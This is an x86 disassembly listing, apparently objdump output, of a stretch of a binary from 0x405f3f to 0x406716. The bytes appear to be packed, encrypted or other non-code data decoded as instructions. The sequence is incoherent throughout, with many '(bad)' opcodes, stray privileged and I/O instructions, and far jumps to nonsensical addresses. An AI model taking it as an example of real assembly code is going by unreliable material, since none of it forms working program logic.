  405f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f40:	pop    ebx
  405f41:	rol    BYTE PTR [ebp-0x4],0x8f
  405f45:	adc    ebx,esp
  405f47:	mov    eax,eax
  405f49:	rcl    BYTE PTR [edx+0x34],1
  405f4c:	sub    cl,ch
  405f4e:	sti    
  405f4f:	pop    eax
  405f50:	es sbb dh,ah
  405f53:	std    
  405f54:	jmp    0xdb418e82
  405f59:	cmp    DWORD PTR [ecx],edx
  405f5b:	mov    al,ds:0xe0c6af81
  405f60:	pop    ebx
  405f61:	(bad)  
  405f63:	xor    esp,esi
  405f65:	cmp    eax,0xe5bb6afc
  405f6a:	fs retf 
  405f6c:	and    eax,0xf12abb25
  405f71:	popf   
  405f72:	mov    cs,WORD PTR ds:0xb62534e2
  405f78:	ins    DWORD PTR es:[edi],dx
  405f79:	data16 sbb dl,BYTE PTR [ebx+edi*1+0x2e]
  405f7e:	cmp    esi,DWORD PTR [eax+0x1e0e0fa1]
  405f84:	loop   0x405f52
  405f86:	inc    ebp
  405f87:	and    ebp,DWORD PTR [eax]
  405f89:	xchg   esi,eax
  405f8a:	cdq    
  405f8b:	les    esi,FWORD PTR [ebx+0x7e]
  405f8e:	mov    DWORD PTR [ebx],ebp
  405f90:	pop    ecx
  405f91:	sar    DWORD PTR [ecx+eiz*2-0x69522083],0xf7
  405f99:	ins    DWORD PTR es:[edi],dx
  405f9a:	xchg   edi,eax
  405f9b:	ret    0xabdc
  405f9e:	cmp    DWORD PTR [ecx],esi
  405fa0:	jnp    0x405f24
  405fa2:	push   ecx
  405fa3:	in     eax,0x23
  405fa5:	cwde   
  405fa6:	add    DWORD PTR [ebx+0x7c4f8d6d],0x2806b732
  405fb0:	push   ds
  405fb1:	adc    DWORD PTR [ecx-0x651a14d8],ebp
  405fb7:	push   ebp
  405fb8:	js     0x405faf
  405fba:	dec    esi
  405fbb:	aam    0x7f
  405fbd:	dec    esp
  405fbe:	xchg   esi,eax
  405fbf:	jecxz  0x405f44
  405fc1:	mov    esi,0x79b8dd3e
  405fc6:	das    
  405fc7:	(bad)  
  405fc8:	out    0xb2,al
  405fca:	ja     0x405fef
  405fcc:	sti    
  405fcd:	mov    edx,0xdc0fae97
  405fd2:	(bad)  
  405fd3:	xchg   edi,eax
  405fd4:	dec    ebp
  405fd5:	(bad)  
  405fd6:	stos   BYTE PTR es:[edi],al
  405fd7:	jb     0x405fe8
  405fd9:	sahf   
  405fda:	cwde   
  405fdb:	imul   edi,DWORD PTR [ecx],0xc3dd7d0
  405fe1:	rcr    BYTE PTR [edi-0x33],1
  405fe4:	icebp  
  405fe5:	push   es
  405fe6:	pop    ss
  405fe7:	shl    DWORD PTR [ecx-0x28],cl
  405fea:	cld    
  405feb:	xor    edi,edx
  405fed:	addr16 dec esi
  405fef:	mov    ds:0x64fd50b9,al
  405ff4:	jb     0x405fdf
  405ff6:	jmp    0x405ffa
  405ff8:	add    BYTE PTR [eax],al
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	enter  0xb14d,0xe8
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x405f98
  406013:	or     bh,0xf
  406016:	(bad)  
  406017:	stc    
  406018:	fldcw  WORD PTR [esi]
  40601a:	xor    al,0x8d
  40601c:	jo     0x405fe2
  40601e:	fwait
  40601f:	inc    ebp
  406020:	mov    bl,0x40
  406022:	adc    edi,DWORD PTR [ecx+0x1b]
  406025:	hlt    
  406026:	fsub   QWORD PTR [edi+ecx*8+0x6ea1db99]
  40602d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40602e:	nop
  40602f:	pushf  
  406030:	and    al,0xbf
  406032:	imul   ecx,DWORD PTR [eax+0x6424d19d],0xf993cb30
  40603c:	(bad)
  40603f:	shl    DWORD PTR [ecx],1
  406041:	rcl    DWORD PTR [edi-0x7a],0xea
  406045:	cs (bad) 
  406047:	scas   eax,DWORD PTR es:[edi]
  406048:	and    DWORD PTR [eax],edi
  40604a:	outs   dx,DWORD PTR ds:[esi]
  40604b:	clc    
  40604c:	cld    
  40604d:	jle    0x406048
  40604f:	mov    esp,0x8995eedb
  406054:	dec    eax
  406055:	sbb    ah,cl
  406057:	addr16 mov ds:0x93d6,eax
  40605b:	mov    edx,0x4ceaf4c0
  406060:	ss retf 
  406062:	dec    esp
  406063:	fwait
  406064:	jmp    0x784b:0x61b4c968
  40606b:	sub    al,0xfe
  40606d:	xchg   edi,eax
  40606e:	push   ds
  40606f:	sub    al,bh
  406071:	adc    al,0xe0
  406073:	stc    
  406074:	fcomp  QWORD PTR [ecx-0xb0a636a]
  40607a:	and    DWORD PTR [edi],0x7c
  40607d:	pusha  
  40607e:	adc    eax,0xd5112aeb
  406083:	push   edx
  406084:	sbb    DWORD PTR [edx-0x40],0xfffffffd
  406088:	out    0xf3,al
  40608a:	inc    edi
  40608b:	popf   
  40608c:	jne    0x406067
  40608e:	outs   dx,BYTE PTR ds:[esi]
  40608f:	sub    edx,edx
  406091:	mov    bl,0x40
  406093:	jp     0x406047
  406095:	cli    
  406096:	pop    ebp
  406097:	ja     0x40602b
  406099:	add    edx,DWORD PTR ds:0xaa25042f
  40609f:	cdq    
  4060a0:	popf   
  4060a1:	dec    edi
  4060a2:	mov    bl,0xb9
  4060a4:	xchg   ecx,eax
  4060a5:	mov    ds:0xcc621b9e,al
  4060aa:	sahf   
  4060ab:	jb     0x4060c7
  4060ad:	shl    BYTE PTR [ecx-0x2617c465],1
  4060b3:	mov    cl,BYTE PTR [ecx+esi*4]
  4060b6:	ins    BYTE PTR es:[edi],dx
  4060b7:	inc    edi
  4060b8:	adc    BYTE PTR [edi+0x4c],al
  4060bb:	add    eax,0xb11e472b
  4060c0:	add    bl,bh
  4060c2:	cmp    DWORD PTR [esi-0x30],0xfffffff1
  4060c6:	add    eax,0x60d71378
  4060cb:	test   eax,0xb4a96069
  4060d0:	out    dx,eax
  4060d1:	(bad)  
  4060d3:	push   ss
  4060d4:	mov    esp,0xfa3731dd
  4060d9:	loopne 0x406077
  4060db:	push   0xb64dc30e
  4060e0:	adc    esp,ecx
  4060e2:	fld    QWORD PTR ds:0x24be5a04
  4060e8:	cmp    al,0x73
  4060ea:	es in  al,0xe9
  4060ed:	fiadd  DWORD PTR [edx+0x3c]
  4060f0:	loope  0x40610d
  4060f2:	jle    0x4060c8
  4060f4:	xor    DWORD PTR [esi+eiz*8+0x6a],ebx
  4060f8:	popa   
  4060f9:	daa    
  4060fa:	mov    ecx,0xac0e1617
  4060ff:	push   esp
  406100:	cmp    DWORD PTR [edx+0x76],eax
  406103:	loopne 0x40612b
  406105:	pushf  
  406106:	jno    0x406104
  406108:	push   edx
  406109:	in     eax,dx
  40610a:	ror    DWORD PTR [eax+eax*1-0x3bb7df10],0x8e
  406112:	mov    ch,0x22
  406114:	mov    ebp,0x83c33d3b
  406119:	inc    esi
  40611a:	pop    ss
  40611b:	and    al,0xd8
  40611d:	add    edi,DWORD PTR [edx-0x78]
  406120:	outs   dx,BYTE PTR ds:[esi]
  406121:	xchg   ecx,eax
  406122:	popf   
  406123:	test   eax,0x1c9bfa2b
  406128:	xchg   edi,eax
  406129:	frstor [edx+eiz*2]
  40612c:	xor    eax,0x534d9aa1
  406131:	xor    ebx,esi
  406133:	jb     0x406178
  406135:	mov    edi,0x503355e
  40613a:	(bad)  
  40613c:	inc    edx
  40613d:	mov    bh,0xbd
  40613f:	into   
  406140:	sbb    BYTE PTR [esi-0x7370aa],cl
  406146:	sub    eax,0xffffffc3
  406149:	mov    eax,ds:0x2cac3ec5
  40614e:	add    BYTE PTR [edx+0xf],ch
  406151:	push   0xffffffa3
  406153:	pop    ebp
  406154:	lods   eax,DWORD PTR ds:[esi]
  406155:	mov    dh,cl
  406157:	jmp    0x83e8c66b
  40615c:	cmc    
  40615d:	xchg   edx,eax
  40615e:	dec    eax
  40615f:	daa    
  406160:	add    edi,DWORD PTR [edx]
  406162:	test   ebp,ecx
  406164:	mov    BYTE PTR [ecx],dh
  406166:	xor    DWORD PTR [edx-0x1e],edi
  406169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40616a:	ja     0x406166
  40616c:	sub    ebx,esi
  40616e:	aas    
  40616f:	mov    esp,0x1bc1e422
  406174:	pop    ss
  406175:	cld    
  406176:	mov    bh,0x2e
  406178:	sbb    DWORD PTR [eax+eiz*1+0x73],eax
  40617c:	xor    BYTE PTR [edi-0x33a4f9dd],bh
  406182:	cmp    al,0x7e
  406184:	mov    esp,0xfdeb2a35
  406189:	aad    0xbb
  40618b:	out    dx,eax
  40618c:	loopne 0x40618e
  40618e:	retf   0x9877
  406191:	enter  0x569c,0xb6
  406195:	fwait
  406196:	outs   dx,BYTE PTR ds:[esi]
  406197:	mov    eax,ds:0x86018bc8
  40619c:	pop    ebp
  40619d:	jb     0x40611f
  40619f:	jmp    0x4061d7
  4061a1:	iret   
  4061a2:	(bad)  
  4061a3:	in     al,dx
  4061a4:	mov    ecx,0xdaeb2839
  4061a9:	jae    0x4061eb
  4061ab:	jg     0x4061fb
  4061ad:	jmp    0xab2:0x3f9ad956
  4061b4:	imul   esi,DWORD PTR [eax+0xf],0xffffffbc
  4061b8:	fwait
  4061b9:	daa    
  4061ba:	push   ss
  4061bb:	es jne 0x4061d7
  4061be:	popf   
  4061bf:	inc    esi
  4061c0:	xor    BYTE PTR [edi+esi*4],al
  4061c3:	loop   0x40615b
  4061c5:	pop    esi
  4061c6:	outs   dx,DWORD PTR ds:[esi]
  4061c7:	mov    ebp,0x1ef45477
  4061cc:	xor    DWORD PTR [ebx+0x1315b05],ebx
  4061d2:	out    dx,eax
  4061d3:	push   ss
  4061d4:	mov    bh,0xe5
  4061d6:	mov    eax,ds:0xbcea9cfe
  4061db:	leave  
  4061dc:	fwait
  4061dd:	xchg   ebp,eax
  4061de:	aaa    
  4061df:	sti    
  4061e0:	shl    ebx,1
  4061e2:	mov    bh,0x6f
  4061e4:	xchg   esi,eax
  4061e5:	cwde   
  4061e6:	lods   al,BYTE PTR ds:[esi]
  4061e7:	mov    ch,0xe0
  4061e9:	lds    edi,FWORD PTR [ebx-0x12]
  4061ec:	shl    DWORD PTR [eax+0x29],1
  4061ef:	(bad)  [ebx+0x47]
  4061f2:	call   0x999b4917
  4061f7:	pop    ebx
  4061f8:	and    DWORD PTR [esp+esi*4-0x73b95344],edi
  4061ff:	dec    ecx
  406200:	push   edi
  406201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406202:	arpl   WORD PTR [ebx-0x483ea28d],cx
  406208:	xor    DWORD PTR [ebx+0x2a],ebx
  40620b:	fld    DWORD PTR [ecx+eiz*4]
  40620e:	sahf   
  40620f:	ficomp DWORD PTR [ecx-0x59]
  406212:	jp     0x406251
  406214:	inc    ebp
  406215:	and    al,0xca
  406217:	mov    dh,BYTE PTR [esi-0x43]
  40621a:	xor    ch,BYTE PTR [esi+edi*2+0x7adbbd44]
  406221:	pop    edx
  406222:	out    0x16,al
  406224:	pop    edx
  406225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406226:	cwde   
  406227:	sub    al,0xf1
  406229:	xor    esp,DWORD PTR [edi+0x7adf5d8a]
  40622f:	pop    ebx
  406230:	adc    cl,BYTE PTR [ebx+0x4604981f]
  406236:	scas   eax,DWORD PTR es:[edi]
  406237:	adc    BYTE PTR [ebx+0x4f18ac2a],0xbd
  40623e:	sub    al,0x45
  406240:	lods   al,BYTE PTR ds:[esi]
  406241:	xchg   ecx,eax
  406242:	push   esp
  406243:	jp     0x40621f
  406245:	ja     0x4061f2
  406247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406248:	std    
  406249:	lock pop ebp
  40624b:	imul   DWORD PTR [ebp-0x38bad263]
  406251:	pushf  
  406252:	neg    BYTE PTR [eax]
  406254:	ja     0x406275
  406256:	mov    ebp,0x416d870c
  40625b:	push   0x638addc4
  406260:	ja     0x40622b
  406262:	fcom   DWORD PTR [ebx]
  406264:	cmp    al,0xe5
  406266:	loopne 0x406282
  406268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406269:	mov    bl,0xe1
  40626b:	pop    edx
  40626c:	pop    edi
  40626d:	cmovae edi,DWORD PTR [ecx-0x7a0aa548]
  406274:	cmp    eax,edx
  406276:	sahf   
  406277:	push   ecx
  406278:	out    dx,eax
  406279:	mov    ah,0xf3
  40627b:	scas   eax,DWORD PTR es:[edi]
  40627c:	sahf   
  40627d:	mov    esi,0x46d4d4b1
  406282:	xchg   esp,eax
  406283:	loopne 0x406260
  406285:	(bad)  
  406286:	xor    al,0x97
  406288:	add    eax,0x3ae14310
  40628d:	dec    esp
  40628e:	sbb    esi,ebx
  406290:	or     eax,0xcf033f85
  406295:	sub    DWORD PTR [eax-0x38],edx
  406298:	out    dx,eax
  406299:	xor    ah,BYTE PTR [edi-0x62]
  40629c:	jmp    0x406307
  40629e:	jle    0x4062ed
  4062a0:	push   ecx
  4062a1:	jns    0x406242
  4062a3:	scas   eax,DWORD PTR es:[edi]
  4062a4:	xor    ah,ah
  4062a6:	dec    esi
  4062a7:	les    edi,FWORD PTR ds:[edi+0x51]
  4062ab:	sub    cl,dl
  4062ad:	out    dx,eax
  4062ae:	or     al,0x33
  4062b0:	icebp  
  4062b1:	call   0x6abc:0x9247e9f3
  4062b8:	mov    bh,BYTE PTR [edi-0x15a7d035]
  4062be:	mov    ch,0x4
  4062c0:	call   0x431b:0x393979a2
  4062c7:	or     al,0x2b
  4062c9:	or     al,0x93
  4062cb:	bound  ecx,QWORD PTR es:[ebx-0x6fce1d37]
  4062d2:	mov    ch,0xb0
  4062d4:	mov    dl,0xa1
  4062d6:	dec    ebx
  4062d7:	mov    al,0x8f
  4062d9:	sbb    eax,0xa12d5721
  4062de:	int    0x3a
  4062e0:	aam    0x3b
  4062e2:	mov    edx,0xf1f78ea0
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xd356015c
  4062fe:	icebp  
  4062ff:	faddp  st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x406379
  406308:	dec    eax
  406309:	ins    BYTE PTR es:[edi],dx
  40630a:	fmul   st(1),st
  40630c:	retf   0x9a8
  40630f:	xchg   edx,eax
  406310:	pop    edi
  406311:	out    dx,eax
  406312:	mov    ds:0xc5b7970,al
  406317:	out    dx,eax
  406318:	outs   dx,DWORD PTR ds:[esi]
  406319:	jb     0x40629e
  40631b:	sub    ecx,DWORD PTR [edi-0x42]
  40631e:	and    cl,al
  406320:	adc    edi,DWORD PTR [edi]
  406322:	adc    eax,0x8e0e489a
  406327:	add    al,0xa2
  406329:	pop    edx
  40632a:	or     al,ch
  40632c:	lahf   
  40632d:	lock xchg edi,eax
  40632f:	pop    ebx
  406330:	jle    0x4062d6
  406332:	(bad)  
  406333:	push   esp
  406334:	call   0x190:0x53616781
  40633b:	aad    0x27
  40633d:	repnz push ebp
  40633f:	lahf   
  406340:	popa   
  406341:	call   0x23f35ccf
  406346:	dec    edx
  406347:	imul   esp,DWORD PTR [ebp+0xe],0x15
  40634b:	arpl   WORD PTR [edx],dx
  40634d:	(bad)  
  40634e:	je     0x4062df
  406350:	push   ss
  406351:	mov    ch,0xed
  406353:	arpl   WORD PTR [edx+0x6990b1c7],si
  406359:	ror    DWORD PTR [edx+0x3],cl
  40635c:	sti    
  40635d:	jb     0x406347
  40635f:	push   0x4f
  406361:	xlat   BYTE PTR ds:[ebx]
  406362:	lods   eax,DWORD PTR ds:[esi]
  406363:	cmp    eax,0x90e6d813
  406368:	and    dh,BYTE PTR [edi]
  40636a:	ins    DWORD PTR es:[edi],dx
  40636b:	idiv   DWORD PTR [ecx+0x751db1e7]
  406371:	cwde   
  406372:	xchg   ebp,eax
  406373:	js     0x4063ea
  406375:	ins    DWORD PTR es:[edi],dx
  406376:	and    DWORD PTR ds:0x70e37ca5,0x5f8e41d9
  406380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406381:	outs   dx,BYTE PTR ds:[esi]
  406382:	cli    
  406383:	call   0x7321:0x38d62088
  40638a:	push   es
  40638b:	and    ecx,ecx
  40638d:	icebp  
  40638e:	ret    0xb9d
  406391:	std    
  406392:	aad    0x39
  406394:	pop    edi
  406395:	or     ebx,esp
  406397:	and    eax,0xaad15267
  40639c:	jne    0x406410
  40639e:	push   esi
  40639f:	vmread edx,ecx
  4063a2:	or     DWORD PTR [ebp+0x58],0x4a
  4063a6:	cmp    BYTE PTR [edx+0x65],cl
  4063a9:	jg     0x4063c5
  4063ab:	loope  0x406391
  4063ad:	ror    DWORD PTR [ecx],0x4e
  4063b0:	shl    DWORD PTR [ebx],0xb6
  4063b3:	mov    edx,0xfc97642c
  4063b8:	fwait
  4063b9:	push   ecx
  4063ba:	jp     0x406387
  4063bc:	add    DWORD PTR [ebx-0x4412e0c2],0xffffff93
  4063c3:	xchg   esp,eax
  4063c4:	loop   0x406421
  4063c6:	int3   
  4063c7:	jbe    0x40642c
  4063c9:	jae    0x406415
  4063cb:	mov    edi,0xc78d916f
  4063d0:	cmp    edi,edi
  4063d2:	jns    0x406427
  4063d4:	adc    al,0x67
  4063d6:	retf   0xd470
  4063d9:	test   DWORD PTR [edx+0x26ca06b0],edi
  4063df:	js     0x40644e
  4063e1:	dec    edx
  4063e2:	fbld   TBYTE PTR [eax]
  4063e4:	shr    esp,0x68
  4063e7:	adc    eax,esi
  4063e9:	or     DWORD PTR [ebp-0x61e1640e],eax
  4063ef:	sbb    al,0xc0
  4063f1:	inc    edi
  4063f2:	cmp    eax,0x10e09199
  4063f7:	jg     0x4063b3
  4063f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063fa:	sbb    al,0xdb
  4063fc:	(bad)
  406400:	sbb    al,0x7
  406402:	push   ebx
  406403:	icebp  
  406404:	xchg   esi,eax
  406405:	add    dl,BYTE PTR [ebp-0x6d]
  406408:	mov    bl,0x9b
  40640a:	and    ah,BYTE PTR [ebx+0x1f51248b]
  406410:	adc    al,0x34
  406412:	mov    cl,0xc0
  406414:	xor    edx,edx
  406416:	push   edx
  406417:	popa   
  406418:	je     0x40648b
  40641a:	shl    BYTE PTR [ebp+0x7e72ede3],1
  406420:	add    eax,0xd9d4626f
  406425:	cmp    DWORD PTR [ecx],eax
  406427:	cmp    esp,DWORD PTR [edi+eax*4-0x1bf5fb86]
  40642e:	jg     0x406416
  406430:	jmp    0x783a0c4c
  406435:	in     al,0xa2
  406437:	jecxz  0x406473
  406439:	rcl    edi,0x42
  40643c:	adc    ebp,DWORD PTR [ebx]
  40643e:	jbe    0x40645e
  406440:	sbb    al,0x96
  406442:	outs   dx,BYTE PTR ds:[esi]
  406443:	pop    ebp
  406444:	jnp    0x40641a
  406446:	jae    0x40640f
  406448:	into   
  406449:	(bad)  
  40644a:	fcom   DWORD PTR [ebx-0x22d1813b]
  406450:	push   ss
  406451:	xchg   BYTE PTR [ecx],al
  406453:	inc    ebp
  406454:	mov    ss,WORD PTR [edi+0x6]
  406457:	test   BYTE PTR [edx],bh
  406459:	xor    eax,0xdcd1d425
  40645e:	jmp    0x406447
  406460:	push   esi
  406461:	inc    edx
  406462:	call   0x3626:0xde98142f
  406469:	enter  0xb46a,0xf0
  40646d:	mov    ch,BYTE PTR [edi]
  40646f:	aas    
  406470:	push   ebp
  406471:	push   edi
  406472:	ffreep st(7)
  406474:	shr    BYTE PTR [edx-0x39],cl
  406477:	popa   
  406478:	ja     0x4064d8
  40647a:	loop   0x4064f3
  40647c:	rol    DWORD PTR ds:0x2f46546d,cl
  406482:	mov    ds:0xd9e7b755,al
  406487:	pop    ebx
  406488:	inc    ebx
  406489:	mov    bl,BYTE PTR [ebx]
  40648b:	mov    ds:0xce82b561,al
  406490:	pop    edi
  406491:	pop    ebp
  406492:	mov    esi,ss
  406494:	retf   0xfe68
  406497:	jl     0x40641c
  406499:	push   esi
  40649a:	ror    DWORD PTR [eax+0xd],0x40
  40649e:	lock dec edi
  4064a0:	fs push cs
  4064a2:	xor    cl,BYTE PTR [edi+0x1f794372]
  4064a8:	fnsave [ebx+0x60baa440]
  4064ae:	jne    0x4064c9
  4064b0:	cmp    BYTE PTR [eax-0x1a],dh
  4064b3:	test   BYTE PTR [ecx-0x4e7a6702],ch
  4064b9:	aas    
  4064ba:	mov    ecx,ecx
  4064bc:	mov    edx,0xae8fe3b5
  4064c1:	ret    0x6fef
  4064c4:	dec    eax
  4064c5:	and    al,0xa5
  4064c7:	sbb    ecx,edi
  4064c9:	ins    BYTE PTR es:[edi],dx
  4064ca:	call   0x589a:0xe4434aac
  4064d1:	mov    al,ds:0xfdae0f1d
  4064d6:	jmp    0x406486
  4064d8:	sti    
  4064d9:	ret    
  4064da:	js     0x406545
  4064dc:	icebp  
  4064dd:	scas   al,BYTE PTR es:[edi]
  4064de:	push   edi
  4064df:	(bad)  
  4064e0:	adc    eax,DWORD PTR [esi]
  4064e2:	mov    ebx,0xdb045639
  4064e7:	shr    DWORD PTR [ecx-0x1b],1
  4064ea:	jno    0x4064c6
  4064ec:	lods   al,BYTE PTR ds:[esi]
  4064ed:	(bad)  [esi]
  4064ef:	sub    ah,BYTE PTR [ecx+0x40]
  4064f2:	sub    cl,BYTE PTR [esi]
  4064f4:	arpl   WORD PTR [ebp+0x1a1bb63b],dx
  4064fa:	in     eax,dx
  4064fb:	xchg   edx,eax
  4064fc:	jle    0x406508
  4064fe:	push   ss
  4064ff:	retf   
  406500:	push   edi
  406501:	jle    0x40653a
  406503:	into   
  406504:	inc    ecx
  406505:	out    0xcf,eax
  406507:	pop    es
  406508:	and    eax,0x66bf7409
  40650d:	sahf   
  40650e:	stc    
  40650f:	adc    esi,eax
  406511:	push   0x0
  406513:	push   edx
  406514:	push   ebx
  406515:	int    0x93
  406517:	or     cl,BYTE PTR [eax]
  406519:	sbb    esi,DWORD PTR [esi+0x79242a14]
  40651f:	mov    al,0x9c
  406521:	xchg   ebp,eax
  406522:	cmp    bl,BYTE PTR [ecx]
  406524:	jae    0x406598
  406526:	jge    0x406533
  406528:	mov    al,0xdf
  40652a:	xchg   esi,eax
  40652b:	repz push ecx
  40652d:	inc    ecx
  40652e:	mov    ah,0xc9
  406530:	push   ss
  406531:	fs push es
  406533:	jle    0x406569
  406535:	pop    edi
  406536:	daa    
  406537:	lods   al,BYTE PTR ds:[esi]
  406538:	xchg   edi,eax
  406539:	retf   
  40653a:	fcomp  DWORD PTR [ecx+0x7bc9020b]
  406540:	retf   0x80f3
  406543:	sub    DWORD PTR [ebx-0x66],ecx
  406546:	arpl   WORD PTR [edi+0x2e],cx
  406549:	jp     0x406576
  40654b:	and    BYTE PTR [eax],0x50
  40654e:	aas    
  40654f:	add    DWORD PTR [ebp-0x1be5af5b],esi
  406555:	into   
  406556:	or     cl,0xeb
  406559:	unpckhps xmm1,XMMWORD PTR [edx+eiz*8]
  40655d:	adc    dh,BYTE PTR [edi+0x4a]
  406560:	and    BYTE PTR [eax+0x50340470],0x25
  406567:	xchg   edi,eax
  406568:	add    al,0xdf
  40656a:	dec    esp
  40656b:	push   cs
  40656c:	mov    eax,ds:0xcdc5c72f
  406571:	push   cs
  406572:	in     al,0xca
  406574:	xchg   esp,eax
  406575:	mov    cl,ah
  406577:	xor    al,bl
  406579:	into   
  40657a:	inc    ch
  40657c:	xor    esp,eax
  40657e:	and    eax,0x3a321694
  406583:	das    
  406584:	push   eax
  406585:	int    0x41
  406587:	mov    al,ds:0xeb0e3bf2
  40658d:	sub    eax,0xe7457a05
  406592:	adc    BYTE PTR [edi-0x649314e1],cl
  406598:	outs   dx,DWORD PTR ds:[esi]
  406599:	stos   DWORD PTR es:[edi],eax
  40659a:	aad    0x76
  40659c:	mov    ds:0xe44ea29,al
  4065a1:	cmp    ah,BYTE PTR [esi+ebp*1]
  4065a4:	(bad)  
  4065a5:	xchg   ebx,eax
  4065a6:	xchg   ecx,eax
  4065a7:	dec    esi
  4065a8:	jmp    0x9a6fc14d
  4065ad:	iret   
  4065ae:	and    esi,ecx
  4065b0:	pop    esi
  4065b1:	and    al,0x57
  4065b3:	jmp    0x3cc50830
  4065b8:	or     ebx,DWORD PTR [esi]
  4065ba:	push   ss
  4065bb:	fisub  WORD PTR [esp+edx*4]
  4065be:	outs   dx,BYTE PTR ds:[esi]
  4065bf:	stos   BYTE PTR es:[edi],al
  4065c0:	out    0x4,al
  4065c2:	pop    DWORD PTR [edx+0x3bed1095]
  4065c8:	and    dl,BYTE PTR [eax-0x32]
  4065cb:	sbb    eax,0x8f3245e1
  4065d0:	xchg   esp,eax
  4065d1:	test   al,0xcc
  4065d3:	leave  
  4065d4:	mov    WORD PTR [edi-0x17],gs
  4065d7:	push   es
  4065d8:	pusha  
  4065d9:	pop    es
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	lods   eax,DWORD PTR ds:[esi]
  4065f6:	cmp    BYTE PTR ds:0x78c433ff,cl
  4065fc:	js     0x40664b
  4065fe:	jle    0x406678
  406600:	js     0x4065e0
  406602:	jb     0x4065c0
  406604:	adc    al,BYTE PTR [ecx+0x1abc14d1]
  40660a:	push   esi
  40660b:	xchg   edx,ebp
  40660d:	adc    eax,0xd37a00
  406612:	mov    eax,ds:0xfa189a94
  406617:	add    esp,DWORD PTR [ecx+eax*1]
  40661a:	daa    
  40661b:	(bad)  
  40661c:	cs in  eax,0xb8
  40661f:	ins    DWORD PTR es:[edi],dx
  406620:	jnp    0x4065fc
  406622:	icebp  
  406623:	mov    al,ds:0xab6c151
  406628:	mov    bl,0x6f
  40662a:	jge    0x406689
  40662c:	out    0x6e,al
  40662e:	xor    bl,BYTE PTR [edx+0xf76e511]
  406634:	mov    ch,0x18
  406636:	out    dx,eax
  406637:	in     al,0x52
  406639:	jb     0x4065cc
  40663b:	mov    edi,0x30514bed
  406640:	pop    ss
  406641:	mov    esi,0x31a2c6
  406646:	dec    ecx
  406647:	outs   dx,BYTE PTR ds:[esi]
  406648:	add    BYTE PTR [esi],ah
  40664a:	dec    edi
  40664b:	jmp    0x5c01:0xc0db5dac
  406652:	das    
  406653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406654:	repnz inc eax
  406656:	or     DWORD PTR [eax+0x15],esi
  406659:	stos   DWORD PTR es:[edi],eax
  40665a:	mov    ebx,0x4c477cb4
  40665f:	cmp    BYTE PTR [esi-0x7e],cl
  406662:	and    edi,esi
  406664:	fcmove st,st(1)
  406666:	jb     0x4066d1
  406668:	stc    
  406669:	xchg   bh,ch
  40666b:	lea    ebx,[ebp+0x78ebab4f]
  406671:	adc    ah,BYTE PTR [eax+0x9]
  406674:	jbe    0x406610
  406676:	push   0x66dfd4dc
  40667b:	fucom  st(6)
  40667d:	or     bh,BYTE PTR [edx-0x486df79a]
  406683:	xor    al,0x68
  406685:	rcr    BYTE PTR [esi],1
  406687:	dec    edi
  406688:	jmp    0x1c897cb9
  40668d:	cmp    al,0xdb
  40668f:	jg     0x406659
  406691:	outs   dx,DWORD PTR ds:[esi]
  406692:	fnsave [ecx-0x5a7341d6]
  406698:	sbb    BYTE PTR [ecx-0x38],dl
  40669b:	arpl   WORD PTR [eax+0x34fdd67a],dx
  4066a1:	adc    eax,0x2b407f22
  4066a6:	hlt    
  4066a7:	aam    0xdb
  4066a9:	pop    edi
  4066aa:	mov    ch,0x2
  4066ac:	sub    DWORD PTR [edx],0xdf5c997c
  4066b2:	pushf  
  4066b3:	xor    al,0x6
  4066b5:	in     eax,0xe6
  4066b7:	dec    esp
  4066b8:	sbb    esp,eax
  4066ba:	(bad)  
  4066bb:	iret   
  4066bc:	mov    ebx,0x46b67e59
  4066c1:	xor    bh,BYTE PTR [edx-0x21]
  4066c4:	pop    ecx
  4066c5:	sbb    BYTE PTR [edi],ch
  4066c7:	les    esi,FWORD PTR [eax+0x6ecd0bc3]
  4066cd:	xchg   ebp,eax
  4066ce:	xor    DWORD PTR [ebx+0x5a],ebp
  4066d1:	jmp    0xc69b:0x5ed1b9fe
  4066d8:	or     BYTE PTR [ebx+eax*1+0x63],ah
  4066dc:	loop   0x40671b
  4066de:	jb     0x40675f
  4066e0:	mov    ds:0xf1047aba,eax
  4066e5:	add    BYTE PTR [ecx-0x1a66f6c0],dh
  4066eb:	pop    esp
  4066ec:	out    0x3,eax
  4066ee:	stos   DWORD PTR es:[edi],eax
  4066ef:	loopne 0x4066df
  4066f1:	xor    al,BYTE PTR [esi-0x3c]
  4066f4:	out    dx,eax
  4066f5:	mov    eax,fs
  4066f7:	clc    
  4066f8:	sub    dh,dh
  4066fa:	fsubr  QWORD PTR [eax]
  4066fc:	pop    esi
  4066fd:	in     eax,dx
  4066fe:	int    0xb5
  406700:	mov    al,ds:0x43d8f794
  406705:	jmp    0xa7095859
  40670a:	or     DWORD PTR [edi+0x69091b40],ecx
  406710:	xor    BYTE PTR [eax],0x9d
  406713:	fwait
  406714:	push   0xffffffd5
  406716:	adc    esp,DWORD PTR [edi-0x4d]
